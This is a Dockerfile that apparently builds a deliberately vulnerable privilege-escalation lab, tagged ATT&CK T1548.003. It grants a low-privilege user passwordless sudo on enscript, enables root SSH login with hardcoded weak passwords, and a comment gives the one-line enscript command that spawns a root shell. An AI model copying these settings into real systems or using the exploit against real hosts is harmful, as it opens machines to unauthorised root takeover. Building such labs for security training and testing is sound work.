FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_enscript
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/enscript as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and enscript
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        enscript \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify enscript is installed
RUN which enscript && ls -la /usr/bin/enscript

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# enscript has an -I (setpagedevice) option that can execute arbitrary commands
# when run as root via sudo. The exploit:
#   sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
# This spawns a root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/enscript" > /etc/sudoers.d/enscript && \
    chmod 440 /etc/sudoers.d/enscript

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]